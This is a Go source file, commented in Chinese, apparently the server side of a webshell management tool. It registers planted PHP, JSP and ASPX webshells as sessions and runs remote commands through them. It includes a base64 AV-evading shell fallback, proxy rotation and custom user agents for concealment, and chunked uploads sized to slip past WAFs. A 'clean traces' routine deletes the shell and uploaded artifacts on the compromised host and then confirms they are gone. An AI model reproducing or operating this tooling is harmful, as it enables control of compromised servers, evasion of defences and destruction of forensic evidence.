// webshellValidateProxy 校验代理串格式（保存会话时就挡住写错的配置）。
func webshellValidateProxy(raw string) error {
	switch strings.ToLower(strings.TrimSpace(raw)) {
	case "", "direct", "off", "none", "直连":
		return nil // 留空＝跟随平台代理；direct 等＝强制直连
	}
	for _, p := range webshellProxyPool(raw) {
		u, err := url.Parse(p)
		if err != nil || u.Host == "" {
			return fmt.Errorf("出口代理格式不对（%s），应为 socks5h://[user:pass@]host:port 或 http://[user:pass@]host:port", webshellRedactProxy(p))
		}
		switch strings.ToLower(u.Scheme) {
		case "socks5", "socks5h", "http", "https":
		default:
			return fmt.Errorf("出口代理协议只支持 socks5 / socks5h / http / https，当前: %s", u.Scheme)
		}
	}
	return nil
}

// webshellClientFor 按会话的出口配置造一个 http.Client，同时返回本次实际出口描述。
func webshellClientFor(sess webshellSession, timeout time.Duration) (*http.Client, string, error) {
	raw := webshellPickProxy(webshellProxyOf(sess), strings.TrimSpace(sess.URL), sess.ProxyRotate)
	if raw == "" {
		return &http.Client{Transport: webshellTransport, Timeout: timeout}, "直连", nil
	}
	u, err := url.Parse(raw)
	if err != nil || u.Host == "" {
		return nil, "", fmt.Errorf("出口代理格式不对（%s）", webshellRedactProxy(raw))
	}
	label := webshellRedactProxy(raw)
	tr := webshellTransport.Clone()

	switch strings.ToLower(u.Scheme) {
	case "socks5", "socks5h":
		var auth *xproxy.Auth
		if u.User != nil {
			pw, _ := u.User.Password()
			auth = &xproxy.Auth{User: u.User.Username(), Password: pw}
		}
		// 目标域名交给代理解析（socks5h 语义），避免本地 DNS 把查询内容露给运营商
		d, derr := xproxy.SOCKS5("tcp", u.Host, auth, &net.Dialer{Timeout: 30 * time.Second})
		if derr != nil {
			return nil, "", fmt.Errorf("SOCKS5 出口不可用（%s）: %v", label, derr)
		}
		tr.Proxy = nil
		tr.DialContext = func(_ context.Context, network, addr string) (net.Conn, error) {
			// x/net/proxy 的 Dial 不接 ctx：超时靠 client.Timeout 兜底
			return d.Dial(network, addr)
		}
	case "http", "https":
		tr.Proxy = http.ProxyURL(u)
	default:
		return nil, "", fmt.Errorf("出口代理协议只支持 socks5 / socks5h / http / https，当前: %s", u.Scheme)
	}
	return &http.Client{Transport: tr, Timeout: timeout}, label, nil
}

func webshellPost(ctx context.Context, sess webshellSession, payload string, timeout time.Duration) (int, string, error) {
	rawURL := strings.TrimSpace(sess.URL)
	if rawURL == "" {
		return 0, "", errors.New("会话缺少 url")
	}
	param := strings.TrimSpace(sess.Password)
	if param == "" {
		param = "pass"
	}
	method := strings.ToUpper(strings.TrimSpace(sess.Method))
	if method == "" {
		method = http.MethodPost
	}
	if method != http.MethodGet && method != http.MethodPost {
		return 0, "", fmt.Errorf("会话 method 只支持 GET / POST，当前: %s", method)
	}

	qs := url.Values{param: []string{payload}}.Encode()
	var (
		req *http.Request
		err error
	)
	if method == http.MethodGet {
		sep := "?"
		if strings.Contains(rawURL, "?") {
			sep = "&"
		}
		req, err = http.NewRequestWithContext(ctx, http.MethodGet, rawURL+sep+qs, nil)
	} else {
		req, err = http.NewRequestWithContext(ctx, http.MethodPost, rawURL, strings.NewReader(qs))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	}
	if err != nil {
		return 0, "", fmt.Errorf("请求构造失败（%s）: %v", rawURL, err)
	}
	ua := strings.TrimSpace(sess.UserAgent)
	if ua == "" {
		ua = webshellDefaultUA
	}
	req.Header.Set("User-Agent", ua)
	req.Header.Set("Accept", "*/*")
	req.Header.Set("Accept-Encoding", "identity") // 不请求压缩，简化解析
	req.Header.Set("Connection", "close")
	for k, v := range sess.Header {
		req.Header.Set(k, v)
	}

	client, _, err := webshellClientFor(sess, timeout)
	if err != nil {
		return 0, "", err
	}
	resp, err := client.Do(req)
	if err != nil {
		var ner net.Error
		if errors.Is(err, context.DeadlineExceeded) || (errors.As(err, &ner) && ner.Timeout()) {
			return 0, "", fmt.Errorf("请求超时（%s）: %s", timeout, rawURL)
		}
		return 0, "", fmt.Errorf("连接失败（%v）: %s", err, rawURL)
	}
	defer func() { _ = resp.Body.Close() }()

	raw, readErr := io.ReadAll(io.LimitReader(resp.Body, webshellHTTPBodyLimit+1))
	if readErr != nil {
		return resp.StatusCode, "", fmt.Errorf("读取响应失败（%s）: %v", rawURL, readErr)
	}
	if len(raw) > webshellHTTPBodyLimit {
		return resp.StatusCode, "", fmt.Errorf("响应超过 %d 字节上限，已中止（%s）", webshellHTTPBodyLimit, rawURL)
	}
	text := webshellDecodeBody(raw)
	if resp.StatusCode < 200 || resp.StatusCode >= 300 {
		return resp.StatusCode, text, fmt.Errorf("远端返回 HTTP %d（%s）: %s", resp.StatusCode, rawURL, webshellBrief(text, 200))
	}
	return resp.StatusCode, text, nil
}

// ---------------------------------------------------------------------------
// 执行原语
// ---------------------------------------------------------------------------

func webshellModeOf(name string) string {
	webshellModeMu.Lock()
	defer webshellModeMu.Unlock()
	return webshellModeCache[name]
}

func webshellSetMode(name, mode string) {
	webshellModeMu.Lock()
	webshellModeCache[name] = mode
	webshellModeMu.Unlock()
}

func webshellDropMode(name string) {
	webshellModeMu.Lock()
	delete(webshellModeCache, name)
	webshellModeMu.Unlock()
}

// webshellExecPHP：php / php_raw 会话执行——先按 eval 型探测，必要时回退到
// base64 免杀马（远端等价于 system(base64_decode($_POST[pass]))）。
func webshellExecPHP(ctx context.Context, name string, sess webshellSession, cmd string, timeout time.Duration) (string, string, error) {
	cached := webshellModeOf(name)
	probeText := ""
	haveProbe := false

	if cached != "raw" {
		payload := webshellPHPCommandPayload(cmd, sess)
		if sess.Type == "php_raw" {
			payload = webshellPHPCodePayload(cmd, sess)
		}
		if payload == "" {
			return "", "", errors.New("PHP 代码为空")
		}
		_, text, err := webshellPost(ctx, sess, payload, timeout)
		if err != nil {
			return "", "", err
		}
		inner, ok, err := webshellExtractMarked(text, sess)
		if err != nil {
			return "", "", err
		}
		if ok {
			webshellSetMode(name, "eval")
			return inner, "eval", nil
		}
		if webshellLooksBlocked(text) {
			return "", "", fmt.Errorf("远端返回的是拦截页/非命令回显（HTTP 200）: %s", webshellBrief(text, 200))
		}
		if sess.Type != "php" {
			return "", "", fmt.Errorf("远端未回标记，疑似不是 PHP 代码执行马；响应前 200 字: %s", webshellBrief(text, 200))
		}
		probeText = text
		haveProbe = true
	}

	// 回退：base64 免杀马
	_, text2, err := webshellPost(ctx, sess, webshellB64Encode([]byte(cmd)), timeout)
	if err != nil {
		return "", "", err
	}
	if webshellLooksBlocked(text2) {
		return "", "", fmt.Errorf("远端返回的是拦截页/非命令回显（HTTP 200）: %s", webshellBrief(text2, 200))
	}
	out := webshellCleanPlain(text2, true)
	if webshellShellErrRE.MatchString(out) {
		probe := ""
		if haveProbe {
			probe = webshellBrief(probeText, 120)
		}
		return "", "", fmt.Errorf("无法识别该 webshell 的载荷模式（eval 试探与 base64 试探都失败）；"+
			"eval 响应: %s；base64 响应: %s", probe, webshellBrief(text2, 120))
	}
	webshellSetMode(name, "raw")
	return out, "raw", nil
}

// webshellExecCmd 统一执行入口：按 type 分发到 eval 型 / 命令型。
func webshellExecCmd(ctx context.Context, name string, sess webshellSession, cmd string, timeout time.Duration) (string, string, error) {
	if sess.Type == "php" || sess.Type == "php_raw" {
		return webshellExecPHP(ctx, name, sess, cmd, timeout)
	}
	if sess.Type != "jsp" && sess.Type != "aspx" {
		return "", "", fmt.Errorf("会话类型非法（只支持 %s）: %s", strings.Join(webshellValidTypes, "/"), sess.Type)
	}
	_, text, err := webshellPost(ctx, sess, cmd, timeout)
	if err != nil {
		return "", "", err
	}
	if webshellLooksBlocked(text) {
		return "", "", fmt.Errorf("远端返回的是拦截页/非命令回显（HTTP 200）: %s", webshellBrief(text, 200))
	}
	return webshellCleanPlain(text, false), "cmd", nil
}

// webshellRunPHPCode 在 eval 型会话里直接跑一段 PHP 代码，返回其输出文本。
func webshellRunPHPCode(ctx context.Context, name string, sess webshellSession, code string, timeout time.Duration) (string, error) {
	if webshellModeOf(name) == "raw" {
		return "", fmt.Errorf("%w：该会话已判定为「系统执行型」马，无法直接执行 PHP 代码", errWSModeMismatch)
	}
	_, text, err := webshellPost(ctx, sess, webshellPHPCodePayload(code, sess), timeout)
	if err != nil {
		return "", err
	}
	inner, ok, err := webshellExtractMarked(text, sess)
	if err != nil {
		return "", err
	}
	if !ok {
		if webshellLooksBlocked(text) {
			return "", fmt.Errorf("远端返回的是拦截页/非命令回显: %s", webshellBrief(text, 200))
		}
		msg := fmt.Errorf("远端未回标记（疑似不是 PHP eval 型马）: %s", webshellBrief(text, 200))
		if sess.Type == "php" {
			return "", fmt.Errorf("%w：%v", errWSModeMismatch, msg)
		}
		return "", msg
	}
	webshellSetMode(name, "eval")
	return inner, nil
}

// ---------------------------------------------------------------------------
// 清痕迹（删远端落地物），与 Python 侧 shell_del 的 remove_remote 分支同一套协议
// ---------------------------------------------------------------------------

// webshellDelItem 是一条远端落地物的删除结果。
type webshellDelItem struct {
	Kind   string `json:"kind"`   // shell = 马文件，artifact = 上传残留
	Path   string `json:"path"`   // 远端路径
	Status string `json:"status"` // OK 已删除 / GONE 原本不存在 / FAIL 删除失败
}

// webshellPurgeResult 是清痕迹的整体结果：SelfGone 才代表马文件确实没了。
type webshellPurgeResult struct {
	Attempted bool              `json:"attempted"`
	SelfPath  string            `json:"self_path,omitempty"`
	SelfGone  bool              `json:"self_gone"`
	Items     []webshellDelItem `json:"items,omitempty"`
	Confirm   string            `json:"confirm,omitempty"`
	Error     string            `json:"error,omitempty"`
}

// webshellSelfPathCode 定位马自身的真实绝对路径。
// 不能用 __FILE__：马是 eval 执行的，__FILE__ 会变成
// "/var/www/x.php(17) : eval()'d code" 这种伪路径，unlink 会静默失败。
// SCRIPT_FILENAME / get_included_files()[0] 拿到的才是入口脚本的真实路径。
func webshellSelfPathCode(n map[string]string) string {
	s, g := n["f"], n["g"]
	return s + "='';" +
		"if(!empty($_SERVER['SCRIPT_FILENAME'])){" + s + "=$_SERVER['SCRIPT_FILENAME'];}" +
		"if(" + s + "===''){" + g + "=@get_included_files();" +
		"if(!empty(" + g + ")){" + s + "=" + g + "[0];}}" +
		"if(" + s + "===''){" + s + "=__FILE__;}" +
		s + "=(@realpath(" + s + ") ?: " + s + ");"
}

// webshellPHPDelCode 拼 PHP 删除代码：逐个 unlink 并回报 OK / GONE / FAIL。
// 马自身用 SCRIPT_FILENAME 定位，不接收外部路径，避免误删同站正常文件。
func webshellPHPDelCode(paths []string, includeSelf bool) string {
	n := webshellVarNames()
	var sb strings.Builder
	sb.WriteString(n["l"] + "=[")
	first := true
	for _, p := range paths {
		if strings.TrimSpace(p) == "" {
			continue
		}
		if !first {
			sb.WriteString(",")
		}
		first = false
		sb.WriteString("base64_decode('" + webshellB64Encode([]byte(p)) + "')")
	}
	sb.WriteString("];")
	if includeSelf {
		sb.WriteString(webshellSelfPathCode(n))
		sb.WriteString(n["l"] + "[]=" + n["f"] + ";")
	}
	sb.WriteString(n["v"] + "=[];" +
		"foreach(" + n["l"] + " as " + n["p"] + "){" +
		"if(!file_exists(" + n["p"] + ")){" + n["v"] + "[]='GONE '." + n["p"] + ";continue;}" +
		n["v"] + "[]=(@unlink(" + n["p"] + ")?'OK ':'FAIL ')." + n["p"] + ";" +
		"}" +
		`echo implode("\n",` + n["v"] + `);`)
	return sb.String()
}

// webshellParseDelOut 解析删除回显，返回 [(状态, 路径)]。
func webshellParseDelOut(text string) []webshellDelItem {
	var out []webshellDelItem
	for _, line := range strings.Split(strings.ReplaceAll(text, "\r", ""), "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		for _, st := range []string{"OK", "GONE", "FAIL"} {
			if strings.HasPrefix(line, st+" ") {
				p := strings.TrimSpace(strings.TrimPrefix(line, st+" "))
				if p != "" {
					out = append(out, webshellDelItem{Path: p, Status: st})
				}
				break
			}
		}
	}
	return out
}

// webshellShellDelCmd 命令型马清理：删完就地判断是否存在，回 OK / FAIL。
func webshellShellDelCmd(paths []string, typ string) string {
	seg := make([]string, 0, len(paths))
	if typ == "aspx" {
		for _, p := range paths {
			q := strings.ReplaceAll(p, `"`, `""`)
			seg = append(seg, fmt.Sprintf(`del /f /q "%s" >nul 2>nul & if exist "%s" (echo FAIL %s) else (echo OK %s)`,
				q, q, p, p))
		}
		return strings.Join(seg, " & ")
	}
	for _, p := range paths {
		sq := webshellShellQuote(p)
		seg = append(seg, fmt.Sprintf("rm -f %s; if [ -e %s ]; then echo 'FAIL %s'; else echo 'OK %s'; fi",
			sq, sq, p, p))
	}
	return strings.Join(seg, "; ")
}

// webshellConfirmSelfGone 删完再打一枪：用一个必然回显的代码载荷试探，
// 取不到标记才算真没了。不能拿「空响应」当判据——加密马收到不认识的载荷本来就是空响应。
func webshellConfirmSelfGone(ctx context.Context, name string, sess webshellSession, timeout time.Duration) (bool, string) {
	// 探针只带一句必然回显的 PHP，内容本身不带任何品牌字样
	probe := webshellPHPCodePayload("echo 1;", sess)
	_, text, err := webshellPost(ctx, sess, probe, timeout)
	if err != nil {
		return true, "复查请求已失败：" + webshellBrief(err.Error(), 120)
	}
	markerBegin, _ := webshellMarkers(sess)
	if strings.Contains(text, markerBegin) {
		return false, "复查仍能打通马并获得回显，文件没删掉"
	}
	if webshellLooksBlocked(text) {
		return true, "复查返回拦截页，已无马的回显"
	}
	return true, "复查响应里已无马的回显"
}

// webshellPurgeSession 删远端落地物：马文件 + 该会话上传过的残留，删完复查。
func (s *Server) webshellPurgeSession(ctx context.Context, name string, sess webshellSession, explicitPath string, timeout time.Duration) *webshellPurgeResult {
	res := &webshellPurgeResult{Attempted: true}
	artifacts := make([]string, 0, len(sess.Artifacts))
	for _, p := range sess.Artifacts {
		if strings.TrimSpace(p) != "" {
			artifacts = append(artifacts, p)
		}
	}
	hint := strings.TrimSpace(explicitPath)
	if hint == "" {
		hint = strings.TrimSpace(sess.RemotePath)
	}
	res.SelfPath = hint

	markItems := func(items []webshellDelItem, selfPath string) {
		for i := range items {
			if i == len(items)-1 && selfPath != "" {
				items[i].Kind = "shell"
			} else {
				items[i].Kind = "artifact"
			}
		}
		res.Items = items
	}

	if (sess.Type == "php" || sess.Type == "php_raw") && webshellModeOf(name) != "raw" {
		out, err := webshellRunPHPCode(ctx, name, sess, webshellPHPDelCode(artifacts, true), timeout)
		if err != nil {
			if errors.Is(err, errWSModeMismatch) {
				res.Error = "该会话已判定为命令执行型马，无法用 PHP unlink 自删；" +
					"请填 remote_path 或传 path 参数，改用系统命令删除"
			} else {
				res.Error = err.Error()
			}
			return res
		}
		items := webshellParseDelOut(out)
		if len(items) == 0 {
			res.Error = "远端 unlink 没回明确结果: " + webshellBrief(out, 200)
			return res
		}
		// 最后一条是 __FILE__（马自身）
		res.SelfPath = items[len(items)-1].Path
		res.SelfGone = items[len(items)-1].Status == "OK" || items[len(items)-1].Status == "GONE"
		markItems(items, res.SelfPath)
	} else {
		if hint == "" {
			res.Error = "命令型会话（" + sess.Type + "）必须知道马的绝对路径才能真正删掉：" +
				"请在会话里填 remote_path，或删除时传 path=/绝对/路径"
			return res
		}
		targets := append([]string{hint}, artifacts...)
		out, _, err := webshellExecCmd(ctx, name, sess, webshellShellDelCmd(targets, sess.Type), timeout)
		if err != nil {
			res.Error = err.Error()
			return res
		}
		items := webshellParseDelOut(out)
		if len(items) == 0 {
			res.Error = "远端删除命令没回明确结果: " + webshellBrief(out, 200)
			return res
		}
		for _, it := range items {
			if it.Path == hint {
				res.SelfGone = it.Status == "OK" || it.Status == "GONE"
			}
		}
		markItems(items, hint)
	}

	gone, detail := webshellConfirmSelfGone(ctx, name, sess, timeout)
	res.Confirm = detail
	if res.SelfGone && !gone {
		res.SelfGone = false
	}
	return res
}

// webshellReadRemoteSize 命令型会话：远端正向 `wc -c < path` 取文件大小。
func webshellReadRemoteSize(ctx context.Context, name string, sess webshellSession, remotePath string, timeout time.Duration) (int64, error) {
	out, _, err := webshellExecCmd(ctx, name, sess, "wc -c < "+webshellShellQuote(remotePath), timeout)
	if err != nil {
		return 0, err
	}
	m := webshellDigitsRE.FindStringSubmatch(out)
	if m == nil {
		return 0, fmt.Errorf("取远端文件大小失败: %s", webshellBrief(out, 160))
	}
	n, err := strconv.ParseInt(m[1], 10, 64)
	if err != nil {
		return 0, fmt.Errorf("取远端文件大小失败: %s", webshellBrief(out, 160))
	}
	return n, nil
}

// webshellParseOKRead 解析 'OK|原始大小|base64'，返回 (size, bytes)。
func webshellParseOKRead(text string) (int64, []byte, error) {
	t := strings.TrimSpace(text)
	m := webshellOKSizeRE.FindStringSubmatch(t)
	if m == nil {
		return 0, nil, fmt.Errorf("远端读取失败: %s", webshellBrief(t, 200))
	}
	size, err := strconv.ParseInt(m[1], 10, 64)
	if err != nil {
		return 0, nil, fmt.Errorf("远端读取失败: %s", webshellBrief(t, 200))
	}
	data, err := webshellB64Decode(t[len(m[0]):])
	if err != nil {
		return 0, nil, fmt.Errorf("远端内容 base64 解码失败（%v）: %s", err, webshellBrief(t, 160))
	}
	return size, data, nil
}

// ---------------------------------------------------------------------------
// HTTP handlers —— 会话
// ---------------------------------------------------------------------------

// webshellListSessions 列出全部会话（不含 password / header 值）。
func (s *Server) webshellListSessions(w http.ResponseWriter, r *http.Request) {
	store, err := s.webshellAllSessions()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	names := make([]string, 0, len(store))
	for name := range store {
		names = append(names, name)
	}
	sort.Strings(names)
	views := make([]webshellSessionView, 0, len(names))
	for _, name := range names {
		views = append(views, webshellView(name, store[name]))
	}
	writeJSON(w, 200, map[string]any{
		"sessions": views,
		"store":    s.webshellStorePath(),
		"types":    webshellValidTypes,
	})
}

// webshellSaveSession 新增 / 覆盖一条会话（校验规则对齐 MCP 的 shell_add）。
func (s *Server) webshellSaveSession(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Name     string          `json:"name"`
		URL      string          `json:"url"`
		Type     string          `json:"type"`
		Password string          `json:"password"`
		Method   string          `json:"method"`
		Header   json.RawMessage `json:"header"`
		Note     string          `json:"note"`
		Remote   string          `json:"remote_path"`
		Proxy    string          `json:"proxy"`
		UA       string          `json:"user_agent"`
		Rotate   *bool           `json:"proxy_rotate"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求体不是合法 JSON: "+err.Error())
		return
	}

	name := strings.TrimSpace(req.Name)
	if !webshellNameRE.MatchString(name) {
		writeErr(w, 400, fmt.Sprintf("会话名非法（1-64 字符，不能含控制字符或路径分隔符）: %q", name))
		return
	}
	rawURL := strings.TrimSpace(req.URL)
	if !webshellURLRE.MatchString(rawURL) {
		writeErr(w, 400, "url 必须以 http:// 或 https:// 开头: "+rawURL)
		return
	}
	typ := strings.ToLower(strings.TrimSpace(req.Type))
	ok := false
	for _, t := range webshellValidTypes {
		if t == typ {
			ok = true
			break
		}
	}
	if !ok {
		writeErr(w, 400, "type 只支持 "+strings.Join(webshellValidTypes, "/")+"，收到: "+typ)
		return
	}
	param := strings.TrimSpace(req.Password)
	if param == "" {
		param = "pass"
	}
	if !webshellParamRE.MatchString(param) {
		writeErr(w, 400, fmt.Sprintf("password 应是参数名（如 pass / cmd / z0），收到: %q", param))
		return
	}
	method := strings.ToUpper(strings.TrimSpace(req.Method))
	if method == "" {
		method = http.MethodPost
	}
	if method != http.MethodGet && method != http.MethodPost {
		writeErr(w, 400, "method 只支持 GET / POST，收到: "+method)
		return
	}

	header := map[string]string{}
	if raw := bytes.TrimSpace(req.Header); len(raw) > 0 && !bytes.Equal(raw, []byte("null")) {
		// 允许 JSON 对象；也允许被转义的 JSON 字符串（表单里手填的情况）。
		// 空字符串 / 空对象都表示「没有自定义 header」，不算错误。
		var asObj map[string]any
		if err := json.Unmarshal(raw, &asObj); err != nil {
			var asStr string
			if err2 := json.Unmarshal(raw, &asStr); err2 != nil {
				writeErr(w, 400, "header 必须是 JSON 对象，例如 {\"X-Token\":\"abc\"}")
				return
			}
			if s := strings.TrimSpace(asStr); s != "" {
				if err3 := json.Unmarshal([]byte(s), &asObj); err3 != nil {
					writeErr(w, 400, "header 不是合法 JSON 对象: "+err3.Error())
					return
				}
			}
		}
		for k, v := range asObj {
			key := strings.TrimSpace(k)
			if key == "" {
				writeErr(w, 400, "header 里存在空键名")
				return
			}
			switch strings.ToLower(key) {
			case "content-length", "host", "connection":
				writeErr(w, 400, "header 不允许覆盖 "+key+"（由客户端管理）")
				return
			}
			header[key] = fmt.Sprint(v)
		}
	}

	note := strings.TrimSpace(req.Note)
	remotePath := strings.TrimSpace(req.Remote)
	if remotePath != "" && !strings.HasPrefix(remotePath, "/") &&
		!webshellWinAbsRE.MatchString(remotePath) {
		writeErr(w, 400, fmt.Sprintf("remote_path 应是绝对路径（/var/www/html/s.php 或 C:\\inetpub\\s.aspx），收到: %q", remotePath))
		return
	}
	proxy := strings.TrimSpace(req.Proxy)
	if err := webshellValidateProxy(proxy); err != nil {
		writeErr(w, 400, err.Error())
		return
	}
	ua := strings.TrimSpace(req.UA)
	if len(ua) > 512 {
		writeErr(w, 400, "user_agent 太长（上限 512 字符）")
		return
	}
	now := time.Now().Format("2006-01-02 15:04:05")

	path := s.webshellStorePath()
	webshellStoreMu.Lock()
	store, err := webshellLoadStore(path)
	if err != nil {
		webshellStoreMu.Unlock()
		writeErr(w, 500, err.Error())
		return
	}
	prev, existed := store[name]
	created := strings.TrimSpace(prev.CreatedAt)
	if created == "" {
		created = now
	}
	if remotePath == "" {
		remotePath = strings.TrimSpace(prev.RemotePath)
	}
	// 没填就沿用旧配置：页面改个备注不该把出口代理清掉
	if proxy == "" {
		proxy = strings.TrimSpace(prev.Proxy)
	}
	if ua == "" {
		ua = strings.TrimSpace(prev.UserAgent)
	}
	// 没传 proxy_rotate 就沿用旧配置（*bool：区分「没传」与「显式 false」）
	rotate := prev.ProxyRotate
	if req.Rotate != nil {
		rotate = *req.Rotate
	}
	sess := webshellSession{
		URL:         rawURL,
		Type:        typ,
		Password:    param,
		Method:      method,
		Header:      header,
		Note:        note,
		RemotePath:  remotePath,
		Artifacts:   prev.Artifacts,
		Proxy:       proxy,
		UserAgent:   ua,
		ProxyRotate: rotate,
		CreatedAt:   created,
	}
	if existed {
		sess.UpdatedAt = now
	}
	store[name] = sess
	err = webshellSaveStore(path, store)
	webshellStoreMu.Unlock()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	// 覆盖时清掉旧的载荷模式缓存
	webshellDropMode(name)

	writeJSON(w, 200, map[string]any{
		"session":     webshellView(name, sess),
		"overwritten": existed,
	})
}

// webshellDeleteSession 删除一条会话。
//
// 默认只摘登记（与旧行为一致）；带 ?remote=1 时先进远端清痕迹：
// 删马文件（eval 型用 PHP unlink(__FILE__) 自删）、删上传残留、再复查确认没回显，
// 最后才摘登记。远端没清干净就不摘（除非 &force=1），避免活着的马静默失联。
func (s *Server) webshellDeleteSession(w http.ResponseWriter, r *http.Request) {
	name := strings.TrimSpace(r.PathValue("name"))
	if name == "" {
		writeErr(w, 400, "缺少会话名")
		return
	}
	q := r.URL.Query()
	removeRemote := q.Get("remote") == "1" || q.Get("remote") == "true"
	force := q.Get("force") == "1" || q.Get("force") == "true"
	explicitPath := strings.TrimSpace(q.Get("path"))
	timeout := webshellSeconds(atoiDefault(q.Get("timeout"), 30), 30, 1, 600)

	sess, err := s.webshellSessionByName(name)
	if err != nil {
		writeErr(w, http.StatusNotFound, err.Error())
		return
	}

	var purge *webshellPurgeResult
	if removeRemote {
		ctx, cancel := context.WithTimeout(r.Context(), timeout*3)
		purge = s.webshellPurgeSession(ctx, name, sess, explicitPath, timeout)
		cancel()
		if !purge.SelfGone && !force {
			webshellDropMode(name)
			writeJSON(w, 409, map[string]any{
				"deleted":   "",
				"type":      sess.Type,
				"remaining": -1,
				"purge":     purge,
				"hint": "远端还没删干净，会话登记已保留：① 用执行接口手动删（rm -f /path）；" +
					"② 确认只想丢弃登记传 force=1。",
			})
			return
		}
	}

	path := s.webshellStorePath()
	webshellStoreMu.Lock()
	store, err := webshellLoadStore(path)
	if err != nil {
		webshellStoreMu.Unlock()
		writeErr(w, 500, err.Error())
		return
	}
	removed, ok := store[name]
	if !ok {
		webshellStoreMu.Unlock()
		writeErr(w, 404, fmt.Sprintf("%v: %s", errWSSessionNotFound, name))
		return
	}
	delete(store, name)
	err = webshellSaveStore(path, store)
	remain := len(store)
	webshellStoreMu.Unlock()
	if err != nil {
		writeErr(w, 500, err.Error())
		return
	}
	webshellDropMode(name)
	resp := map[string]any{
		"deleted":   name,
		"type":      removed.Type,
		"remaining": remain,
	}
	if purge != nil {
		resp["purge"] = purge
	}
	writeJSON(w, 200, resp)
}

// ---------------------------------------------------------------------------
// HTTP handlers —— 执行 / 上传 / 下载
// ---------------------------------------------------------------------------

// webshellExec 在指定会话上执行一条命令，返回纯 stdout。
func (s *Server) webshellExec(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Name    string `json:"name"`
		Cmd     string `json:"cmd"`
		Timeout int    `json:"timeout"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求体不是合法 JSON: "+err.Error())
		return
	}
	name := strings.TrimSpace(req.Name)
	cmd := strings.TrimSpace(req.Cmd)
	if name == "" {
		writeErr(w, 400, "缺少会话名")
		return
	}
	if cmd == "" {
		writeErr(w, 400, "命令不能为空")
		return
	}
	sess, err := s.webshellSessionByName(name)
	if err != nil {
		writeErr(w, webshellErrCode(err), err.Error())
		return
	}
	timeout := webshellSeconds(req.Timeout, 30, 1, 600)

	t0 := time.Now()
	out, mode, err := webshellExecCmd(r.Context(), name, sess, cmd, timeout)
	if err != nil {
		writeErr(w, 502, err.Error())
		return
	}
	truncated := false
	if len(out) > webshellExecOutputLimit {
		out = out[:webshellExecOutputLimit]
		truncated = true
	}
	writeJSON(w, 200, map[string]any{
		"output":     out,
		"type":       sess.Type,
		"mode":       mode,
		"truncated":  truncated,
		"elapsed_ms": time.Since(t0).Milliseconds(),
	})
}

// webshellUpload 分块追加写入远端文件（每块 ≤512KB，避免超长请求被 WAF 拦）。
func (s *Server) webshellUpload(w http.ResponseWriter, r *http.Request) {
	var req struct {
		Name       string  `json:"name"`
		RemotePath string  `json:"remote_path"`
		Content    *string `json:"content"`
		B64        *string `json:"b64"`
		ChunkSize  int     `json:"chunk_size"`
		Timeout    int     `json:"timeout"`
	}
	if err := decode(r, &req); err != nil {
		writeErr(w, 400, "请求体不是合法 JSON: "+err.Error())
		return
	}
	name := strings.TrimSpace(req.Name)
	remotePath := strings.TrimSpace(req.RemotePath)
	if name == "" {
		writeErr(w, 400, "缺少会话名")
		return
	}
	if remotePath == "" {
		writeErr(w, 400, "缺少远端路径 remote_path")
		return
	}
	hasB64 := req.B64 != nil && strings.TrimSpace(*req.B64) != ""
	hasText := req.Content != nil && *req.Content != ""
	if hasB64 == hasText {
		writeErr(w, 400, "content 与 b64 必须二选一（文本内容 / base64 内容），不能同时给或都不给")
		return
	}
	var data []byte
	if hasB64 {
		dec, err := webshellB64Decode(*req.B64)
		if err != nil {
			writeErr(w, 400, fmt.Sprintf("b64 解码失败（%v）: %s", err, webshellBrief(*req.B64, 80)))
			return
		}
		data = dec
	} else {
		data = []byte(*req.Content)
	}
	if len(data) > webshellUploadMax {
		writeErr(w, 400, fmt.Sprintf("内容过大（%d 字节），单次上传上限 %d 字节", len(data), webshellUploadMax))
		return
	}
	sess, err := s.webshellSessionByName(name)
	if err != nil {
		writeErr(w, webshellErrCode(err), err.Error())
		return
	}
	timeout := webshellSeconds(req.Timeout, 30, 1, 600)
	chunk := webshellChunkDefault
	if req.ChunkSize > 0 {
		chunk = webshellClampInt(req.ChunkSize, 4096, webshellChunkMax)
	}

	total := len(data)
	parts := (total + chunk - 1) / chunk
	if parts < 1 {
		parts = 1
	}

	written := 0
	usePHP := (sess.Type == "php" || sess.Type == "php_raw") && webshellModeOf(name) != "raw"
	t0 := time.Now()
	if usePHP {
		var phpErr error
		for i := 0; i < parts; i++ {
			start := i * chunk
			endInt := min((i+1)*chunk, total)
			part := data[start:endInt]
			n, perr := webshellUploadPHPChunk(r.Context(), name, sess, remotePath, part, i > 0, timeout)
			if perr != nil {
				if errors.Is(perr, errWSModeMismatch) {
					// 远端不是 eval 型：降级到命令型上传，从头重写一遍
					webshellSetMode(name, "raw")
					usePHP = false
					written = 0
					break
				}
				phpErr = perr
				break
			}
			if n != len(part) {
				phpErr = fmt.Errorf("第 %d 块写入长度不符（期望 %d，实得 %d）", i+1, len(part), n)
				break
			}
			written += n
		}
		if phpErr != nil {
			writeErr(w, 502, phpErr.Error())
			return
		}
	}
	if !usePHP {
		for i := 0; i < parts; i++ {
			start := i * chunk
			endInt := min((i+1)*chunk, total)
			part := data[start:endInt]
			if err := webshellUploadShellChunk(r.Context(), name, sess, remotePath, part, i > 0, timeout); err != nil {
				writeErr(w, 502, err.Error())
				return
			}
			written += len(part)
		}
	}

	verify := ""
	if !usePHP && sess.Type != "aspx" {
		remoteSize, err := webshellReadRemoteSize(r.Context(), name, sess, remotePath, timeout)
		if err != nil {
			writeErr(w, 502, err.Error())
			return
		}
		if remoteSize != int64(total) {
			writeErr(w, 502, fmt.Sprintf("上传校验失败：期望 %d 字节，远端实际 %d 字节", total, remoteSize))
			return
		}
		verify = fmt.Sprintf("wc -c 校验一致（%d 字节）", remoteSize)
	}
	if written != total {
		writeErr(w, 502, fmt.Sprintf("上传不完整：期望 %d 字节，实际写入 %d 字节", total, written))
		return
	}
	how := "PHP file_put_contents"
	if !usePHP {
		how = "shell/PowerShell 命令"
	}
	// 记入会话的上传残留清单：删会话时按这份清单清远端文件
	if err := s.webshellRememberArtifact(name, remotePath); err != nil {
		// 记账失败不影响上传结果，只在响应里提示
